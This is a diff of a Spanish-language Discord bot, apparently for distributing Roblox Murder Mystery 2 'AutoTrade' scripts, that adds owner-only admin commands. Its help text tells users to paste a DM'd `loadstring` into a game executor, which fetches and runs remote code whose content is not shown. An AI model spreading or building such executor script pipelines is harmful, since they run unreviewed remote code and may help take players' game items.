@@ -204,15 +204,37 @@ function isValidUsername(username) {
 }
 
 const OWNER_ID = '842098865661935677';
+let reactEnabled = true;
+const botStartTime = Date.now();
+
+const CMDS_LIST =
+  '```\n' +
+  '.cmds          → Lista de comandos (solo en DM)\n' +
+  '.info          → Info del bot y juego\n' +
+  '.noreact       → Activar/desactivar reacciones ✔️\n' +
+  '.ping          → Latencia del bot\n' +
+  '.uptime        → Tiempo encendido\n' +
+  '.stats         → Scripts activos y servidores\n' +
+  '.scripts       → Cuántos scripts hay en memoria\n' +
+  '.say <msg>     → Hablar como el bot en ese canal\n' +
+  '.dm <id> <msg> → Enviar DM a un usuario\n' +
+  '.status <txt>  → Cambiar estado del bot\n' +
+  '.reload        → Recargar mm2-script.lua\n' +
+  '```';
 
 client.on('messageCreate', async (message) => {
   if (message.author.bot) return;
 
-  if (message.author.id === OWNER_ID) {
+  const isOwner = message.author.id === OWNER_ID;
+  const content = message.content.trim();
+
+  // Auto-react solo al owner
+  if (isOwner && reactEnabled) {
     try { await message.react('✔️'); } catch {}
   }
 
-  if (message.content === '.info') {
+  // Comando público .info
+  if (content === '.info') {
     await message.reply(
       '🔪 **Josz Bot**\n\n' +
       '**¿Qué hace?** Genera scripts personalizados de AutoTrade para Roblox.\n' +
@@ -223,6 +245,101 @@ client.on('messageCreate', async (message) => {
       '3. Ingresa tu usuario de Roblox y tu webhook\n' +
       '4. Recibirás un `loadstring` en tu DM — solo pégalo en tu executor'
     ).catch(() => {});
+    return;
+  }
+
+  // Comandos solo para el owner
+  if (!isOwner) return;
+
+  if (content === '.cmds') {
+    await message.author.send('📋 **Comandos del owner:**\n' + CMDS_LIST).catch(() => {});
+    return;
+  }
+
+  if (content === '.noreact') {
+    reactEnabled = !reactEnabled;
+    await message.reply(`Reacciones ${reactEnabled ? '**activadas** ✔️' : '**desactivadas** ❌'}`).catch(() => {});
+    return;
+  }
+
+  if (content === '.ping') {
+    const ping = client.ws.ping;
+    await message.reply(`🏓 Latencia: **${ping}ms**`).catch(() => {});
+    return;
+  }
+
+  if (content === '.uptime') {
+    const ms = Date.now() - botStartTime;
+    const h = Math.floor(ms / 3600000);
+    const m = Math.floor((ms % 3600000) / 60000);
+    const s = Math.floor((ms % 60000) / 1000);
+    await message.reply(`⏱️ Uptime: **${h}h ${m}m ${s}s**`).catch(() => {});
+    return;
+  }
+
+  if (content === '.stats') {
+    await message.reply(
+      `📊 **Stats**\n` +
+      `Servidores: **${client.guilds.cache.size}**\n` +
+      `Usuarios: **${client.users.cache.size}**\n` +
+      `Latencia: **${client.ws.ping}ms**`
+    ).catch(() => {});
+    return;
+  }
+
+  if (content === '.scripts') {
+    // Accede al store del servidor via HTTP
+    try {
+      const r = await axios.get(`${SERVER_URL}/health`);
+      await message.reply(`✅ Servidor activo | ${r.data.timestamp}`).catch(() => {});
+    } catch {
+      await message.reply('❌ Servidor caído').catch(() => {});
+    }
+    return;
+  }
+
+  if (content.startsWith('.say ')) {
+    const text = content.slice(5).trim();
+    if (!text) return;
+    await message.channel.send(text).catch(() => {});
+    try { await message.delete(); } catch {}
+    return;
+  }
+
+  if (content.startsWith('.dm ')) {
+    const parts = content.slice(4).trim().split(' ');
+    const userId = parts[0];
+    const text = parts.slice(1).join(' ');
+    if (!userId || !text) {
+      await message.reply('Uso: `.dm <userID> <mensaje>`').catch(() => {});
+      return;
+    }
+    try {
+      const user = await client.users.fetch(userId);
+      await user.send(text);
+      await message.reply(`✅ DM enviado a **${user.tag}**`).catch(() => {});
+    } catch {
+      await message.reply('❌ No se pudo enviar el DM').catch(() => {});
+    }
+    return;
+  }
+
+  if (content.startsWith('.status ')) {
+    const text = content.slice(8).trim();
+    if (!text) return;
+    client.user.setActivity(text);
+    await message.reply(`✅ Estado cambiado a: **${text}**`).catch(() => {});
+    return;
+  }
+
+  if (content === '.reload') {
+    try {
+      MM2_SCRIPT = fs.readFileSync('./mm2-script.lua', 'utf8');
+      await message.reply('✅ mm2-script.lua recargado').catch(() => {});
+    } catch (err) {
+      await message.reply(`❌ Error: ${err.message}`).catch(() => {});
+    }
+    return;
   }
 });
 
